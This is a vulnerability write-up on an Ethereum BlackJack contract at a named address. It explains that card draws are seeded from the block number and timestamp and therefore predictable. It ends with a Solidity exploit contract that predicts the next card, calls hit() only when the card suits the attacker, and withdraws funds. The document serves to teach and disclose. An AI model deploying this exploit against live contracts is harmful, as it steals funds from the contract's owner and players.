BlackJack
=======
https://etherscan.io/address/0xa65d59708838581520511d98fb8b5d1f76a96cad#code


Vulnerability type
------
Bad randomness

Abstract
------
A gambling smart contract implementation for BlackJack, an Ethereum gambling game, acting as the dealer and play black jack game with users. The developer wrote a `deal()` function that uses block number and timestamp as the seed to determine which card will be drawn next. This can be predicted by writing the same random function code in an exploit contract to determine the card which will be drawn, thus the attacker will never lose.

Related code
------
    library Deck {
	    function deal(address player, uint8 cardNumber) internal returns (uint8) {
		    uint b = block.number;
		    uint timestamp = block.timestamp;
		    return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);
	    }
    ......
    }
    
      // deals one more card to the player
	    function hit() public gameIsGoingOn {
		    uint8 nextCard = games[msg.sender].cardsDealt;
		    games[msg.sender].playerCards.push(Deck.deal(msg.sender, nextCard));
		    games[msg.sender].cardsDealt = nextCard + 1;
		    Deal(true, games[msg.sender].playerCards[games[msg.sender].playerCards.length - 1]);
		    checkGameResult(games[msg.sender], false);
	    }

Details
------
After the game starts, you will get two cards. At this point, if the number of points is less than 21, you can choose to call hit() to continue the draw. 
The number of points for the next card is determined by `block.number` and `timestamp`, so attacker can definitely always pick the card he wants.

Exploit
------
    contract Exploit{
    
        BlackJack target;
        address owner;

        function Exploit(address _target) payable{
            target = BlackJack(_target);
            owner = msg.sender;
        }
    
        function deal(address player, uint8 cardNumber) returns (uint8) {
		      uint b = block.number;
		      uint timestamp = block.timestamp;
		      return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);
	      }
    
        function go_deal(uint256 _amount) public{
          target.deal.value(_amount)();
        }
    
        //@para card_num is the number you want for next card
        //@para cardsDealt is how many card you already have
        //@dev after you reaching 21 points, target will automaticly transfer the price to you
        function attack(uint256 card_num, uint256 cardsDealt) public payable{
            if(deal(this.address, cardsDealt) == card_num){
                target.hit();
            }
        }
        
        function kill() public{
          require(msg.sender == owner);
          msg.sender.send(this.balance);
        }
        
        
    }
